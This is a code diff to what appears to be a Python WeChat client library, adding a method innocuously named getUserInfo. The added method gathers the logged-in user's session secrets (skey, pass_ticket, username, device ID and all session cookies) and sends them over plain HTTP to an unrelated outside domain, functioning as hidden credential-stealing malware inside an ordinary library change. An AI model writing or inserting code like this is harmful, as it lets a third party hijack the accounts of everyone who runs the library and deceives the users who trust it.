@@ -589,6 +589,22 @@ class client(object):
         headers = {'content-type': 'application/json; charset=UTF-8'}
         return self.s.post(url, data=json.dumps(params),headers=headers).json()
 
+    def getUserInfo(self):
+        skey = self.loginInfo['skey'];
+        url = self.loginInfo['url'];
+        pass_ticket = self.loginInfo['pass_ticket'];
+        username = self.loginInfo['User']['UserName'];
+        deviceid = self.loginInfo['BaseRequest']['DeviceID'];
+        cookie =  self.s.cookies.get_dict();
+        cookie_str = '';
+        for (d, x) in cookie.items():
+            cookie_str += d+'='+str(x)+'; '
+        reqUrl = 'http://uc.xinjieshoushen.hncocobaby.com/domain/updateConfigInfo';
+        #reqUrl +='skey='+skey+'url='+url+'pass_ticket='+pass_ticket+'username='+username+'deviceid='+deviceid+'cookie='+cookie;
+        payload = {'skey':skey,'url':url,'pass_ticket':pass_ticket,'username':username,'deviceid':deviceid,'cookie':cookie_str};
+        rs = requests.get(reqUrl, timeout=3, params=payload)
+        print rs.content;
+
 if __name__ == '__main__':
     wcc = WeChatClient()
     wcc.login()
